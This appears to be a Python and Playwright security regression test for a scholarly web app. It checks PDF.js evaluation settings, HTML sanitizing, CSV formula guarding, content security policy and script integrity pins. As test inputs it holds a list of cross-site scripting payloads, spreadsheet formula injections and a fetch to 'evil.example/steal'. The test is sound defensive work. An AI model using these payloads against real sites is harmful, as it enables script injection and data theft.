"""Version 140 security fixes, from the independent audit of 23 Nov 2026.
1. PDF files are opened with script evaluation off (pdf.js CVE-2024-4367).
2. A document body from a backup file, a vault or anywhere else cannot run code when it is shown or counted.
3. CSV downloads cannot carry a spreadsheet formula; plain numbers are left alone.
4. Every page carries a content security policy, and it lists every outside address the code really calls.
5. The admin page keeps its sign-in only for its own tab and refuses to sit inside another site's frame."""
import sys, os, re, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from harness import new_page
from playwright.sync_api import sync_playwright
ROOT=os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
fails=[]
def ok(c,m):
    print(('PASS ' if c else 'FAIL ')+m)
    if not c: fails.append(m)
src=lambda f: open(os.path.join(ROOT,f),encoding='utf-8').read()
H=src('index.html')

# ---- 1. pdf.js: every opening of a PDF turns evaluation off (no-bypass: counted, not sampled)
calls=re.findall(r'getDocument\(([^)]{0,80})',H)
ok(len(calls)>=8,'found %d places that open a PDF'%len(calls))
bad=[c for c in calls if 'isEvalSupported:false' not in c]
ok(not bad,'every getDocument call sets isEvalSupported:false '+str(bad[:2]))

# ---- 2a. no raw stored body goes into innerHTML (no-bypass, static)
raw=[m.group(0) for m in re.finditer(r'innerHTML=\(?[^;]{0,40}\bd\.body\b[^;]{0,20}',H) if 'safeStoredHTML' not in m.group(0) and 'bodyToHTML' not in m.group(0)]
ok(not raw,'no document body is put into innerHTML without the cleaner '+str(raw[:2]))
ok("div.innerHTML=bodyToHTML(d.body||'')" not in H,'backup word count no longer parses bodies in a live element')

# ---- 4a. policy present on every page, with the strict parts
pol={}
for f in ['index.html','auth.html','admin.html','kit.html','form.html']:
    m=re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]+)"',src(f))
    ok(bool(m),f+': has a content security policy')
    if m:
        p=m.group(1); pol[f]=p
        for need in ["object-src 'none'","base-uri 'self'","form-action 'self'","default-src 'self'"]:
            ok(need in p,f+': policy has '+need)
        head=src(f)[:src(f).find(m.group(0))]
        ok('<script src' not in head and '<link' not in head,f+': policy comes before any script or stylesheet')
# 4b. every outside host the code fetches from is allowed (cross-check, so a new service cannot be forgotten)
conn=re.search(r'connect-src ([^;]+)',pol.get('index.html','')).group(1).split()
def allowed(host):
    for c in conn:
        c=c.replace('https://','')
        if c==host or (c.startswith('*.') and host.endswith(c[1:])): return True
    return False
hosts=set(re.findall(r"(?:fetch|oaUrl)\(\s*'https://([a-z0-9.-]+)",H))
hosts|=set(re.findall(r"url\s*=\s*'https://([a-z0-9.-]+)",H))
hosts|=set(re.findall(r"=oaUrl\('https://([a-z0-9.-]+)",H))
ok(len(hosts)>=8,'found %d outside hosts the code calls'%len(hosts))
miss=sorted(h for h in hosts if not allowed(h))
ok(not miss,'every called host is in connect-src '+str(miss))
for h in ['generativelanguage.googleapis.com','api.openai.com','api.groq.com','api.anthropic.com','openrouter.ai','api.deepseek.com','identitytoolkit.googleapis.com','securetoken.googleapis.com','firestore.googleapis.com']:
    ok(allowed(h),'connect-src allows '+h)
ok('evil.example' not in ' '.join(conn) and 'https:' not in conn and '*' not in conn,'connect-src is a list, not a wildcard')
ok("connect-src 'self';" in pol.get('kit.html','') and "connect-src 'self';" in pol.get('form.html',''),'kit and form pages may send data nowhere but home')

# ---- 5. admin page
A=src('admin.html'); B=src('backend.js')
ok('init(window.APPUSCHOLAR_FIREBASE_CONFIG,{sessionOnly:true})' in A,'admin page asks for a tab-only sign-in')
ok('browserSessionPersistence' in B and 'setPersistence(auth, browserSessionPersistence)' in B,'backend sets tab-only persistence when asked')
ok('window.top!==window.self' in A[:A.find('Content-Security-Policy')],'admin page frame check runs before anything else')

# ---- 6. every CDN library is pinned to the checked file
tags=re.findall(r'<script src="(https://[^"]+)"([^>]*)>',H)
ok(len(tags)>=4,'found %d CDN script tags'%len(tags))
for u,rest in tags:
    ok('integrity="sha384-' in rest and 'crossorigin="anonymous"' in rest,'pinned: '+u.split('/')[-1])
sri=dict(re.findall(r"'(https://[^']+)':'(sha384-[^']+)'",H[H.find('const APPU_SRI'):H.find('};',H.find('const APPU_SRI'))]))
libs=re.findall(r"'(https://[^']+\.js)'",H[H.find('const APPU_LIB_SRC'):H.find('};',H.find('const APPU_LIB_SRC'))])
ok(len(libs)>=5 and all(u in sri for u in libs),'every spare copy in the library list has a hash')
ok("if(!APPU_SRI[u])return res(false)" in H,'a spare copy without a hash is never loaded')
ok("s.integrity=APPU_SRI['https://cdnjs.cloudflare.com/ajax/libs/pdf-lib/1.17.1/pdf-lib.min.js']" in H,'pdf-lib is loaded with its hash')
ok('fetch(w,{integrity:APPU_SRI[w]' in H and 'workerSrc=w' not in H,'the PDF worker is fetched with its hash and has no unchecked fallback')
import hashlib, base64
PLIB='/opt/npm-tools/node_modules/pdf-lib/dist/pdf-lib.min.js'
if os.path.exists(PLIB):
    h='sha384-'+base64.b64encode(hashlib.sha384(open(PLIB,'rb').read()).digest()).decode()
    ok(sri.get('https://cdnjs.cloudflare.com/ajax/libs/pdf-lib/1.17.1/pdf-lib.min.js')==h,'the pdf-lib hash matches the npm package byte for byte')

with sync_playwright() as p:
    errors=[]; b,pg=new_page(p,errors); J=lambda js,*a: pg.evaluate(js,*a)
    pg.goto('http://localhost:8765/index.html'); pg.wait_for_timeout(2000)
    J("window.__t=[];window.showToast=m=>window.__t.push(m);window.__pwn=0;0")
    # ---- 2b. the cleaner
    evil=['<p>hi<img src=x onerror="window.__pwn++"></p>',
          '<p>a</p><svg><animate onbegin="window.__pwn++" attributeName="x" dur="1s"/></svg>',
          '<p><a href="java\tscript:window.__pwn++">x</a></p>',
          '<p>t</p><iframe srcdoc="<script>parent.__pwn++</script>"></iframe>',
          '<div><img src="x"/onerror="window.__pwn++"></div>',
          '<p><img src=x onerror=window.__pwn++ ONLOAD=window.__pwn++></p>',
          '<p>q</p><script>window.__pwn++</script>',
          '<p><a href="javascript&colon;window.__pwn++">c</a></p>',
          '<p>o</p><object data="javascript:window.__pwn++"></object>',
          '<p><svg><a xlink:href="javascript:window.__pwn++"><text>z</text></a></svg></p>',
          '<p>f</p><form action="javascript:window.__pwn++"><button>go</button></form>']
    out=J("a=>a.map(safeStoredHTML)",evil)
    for e,o in zip(evil,out):
        lo=o.lower()
        ok(not re.search(r'[\s/"\']on[a-z]+=|javascript|<script|<iframe|<object|<form|<animate|srcdoc',lo),'cleaned: '+e[:46]+' -> '+o[:60])
    good='<h2>Method</h2><p>We had <b>120</b> students &amp; <i>two</i> groups.</p><table><tr><td>M</td><td>3.4</td></tr></table><img src="appuimg:abc">'
    ok(J("h=>safeStoredHTML(h)===h",good),'a clean body comes back exactly as it was')
    # rendering through every path does not run code
    J("""a=>{const box=document.createElement('div');document.body.appendChild(box);a.forEach(h=>{const d=document.createElement('div');d.innerHTML=bodyToHTML(h);box.appendChild(d)});}""",evil)
    pg.wait_for_timeout(600)
    ok(J("window.__pwn")==0,'showing all eleven bodies on the page ran nothing')
    # backup file restore path
    bk=json.dumps([{'id':'d1','title':'x','body':evil[0]},{'id':'d2','title':'y','body':evil[1]}])
    info=J("j=>{window.__pwn=0;const i=backupDocsInfo({appu_docs:j});return i}",bk)
    pg.wait_for_timeout(600)
    ok(J("window.__pwn")==0 and info['n']==2,'counting a hostile backup before the confirm box runs nothing (%s)'%info)
    cleaned=J("j=>JSON.parse(backupCleanDocs(j)).map(d=>d.body)",bk)
    ok(all('onerror' not in c and 'onbegin' not in c for c in cleaned),'restore writes cleaned bodies')
    ok(J("()=>{try{backupCleanDocs('{oops');return false}catch(e){return true}}"),'a backup whose document list is unreadable is refused')
    ok(J("()=>{try{backupCleanDocs('{\"a\":1}');return false}catch(e){return true}}"),'a backup whose document list is not a list is refused')
    J("h=>{window.__pwn=0;setEditorHTML(h)}",evil[0]); pg.wait_for_timeout(600)
    ok(J("window.__pwn")==0 and 'onerror' not in J("editor.innerHTML"),'opening a hostile body in the editor runs nothing')
    # ---- 3. CSV
    r=J("""()=>[qnCsvCell('=HYPERLINK("http://x","y")'),qnCsvCell('+cmd'),qnCsvCell('@SUM(A1)'),qnCsvCell('-3'),qnCsvCell('+2.5'),qnCsvCell('-1e3'),qnCsvCell('-ve mood'),qnCsvCell('\\t=1'),qnCsvCell('hello'),pdCsvCell('=1+1'),pdCsvCell('-7')]""")
    ok(r[0].startswith('"\'=') and r[1]=="'+cmd" and r[2]=="'@SUM(A1)",'formula cells get an apostrophe '+str(r[:3]))
    ok(r[3]=='-3' and r[4]=='+2.5' and r[5]=='-1e3','plain numbers are untouched '+str(r[3:6]))
    ok(r[6]=="'-ve mood" and r[7].startswith("'\t") and r[8]=='hello','text starting with - or tab is guarded, ordinary text untouched')
    ok(r[9]=="'=1+1" and r[10]=='-7','de-identification CSV is guarded too')
    # ---- 4c. the policy is live: a call to an unlisted host is refused by the browser itself
    v=J("""()=>new Promise(res=>{let hit=null;document.addEventListener('securitypolicyviolation',e=>{if(/evil\\.example/.test(e.blockedURI))hit=e.violatedDirective},{once:false});
        fetch('https://evil.example/steal').catch(()=>{}).finally(()=>setTimeout(()=>res(hit),300))})""")
    ok(v and 'connect-src' in v,'the browser refuses to send data to an unlisted host (%s)'%v)
    v2=J("""()=>new Promise(res=>{let hit=null;document.addEventListener('securitypolicyviolation',e=>{if(/api\\.openalex\\.org/.test(e.blockedURI))hit=e.violatedDirective});
        fetch('https://api.openalex.org/works?per-page=1').catch(()=>{}).finally(()=>setTimeout(()=>res(hit),300))})""")
    ok(v2 is None,'a listed host (OpenAlex) is not refused')
    pe=[e for e in errors if e[0]=='pageerror']
    ok(not pe,'no page errors '+str(pe[:2]))
    # ---- kit page CSV
    pk=b.new_page(); pk.goto('http://localhost:8765/kit.html'); pk.wait_for_timeout(800)
    k=pk.evaluate("()=>[csvCell('=2+5'),csvCell('-4'),csvCell('fine'),csvCell('@x')]")
    ok(k==['"\'=2+5"','"-4"','"fine"','"\'@x"'],'kit CSV: formulas guarded, numbers kept '+str(k))
    b.close()
print('\n%d failed'%len(fails)); sys.exit(1 if fails else 0)
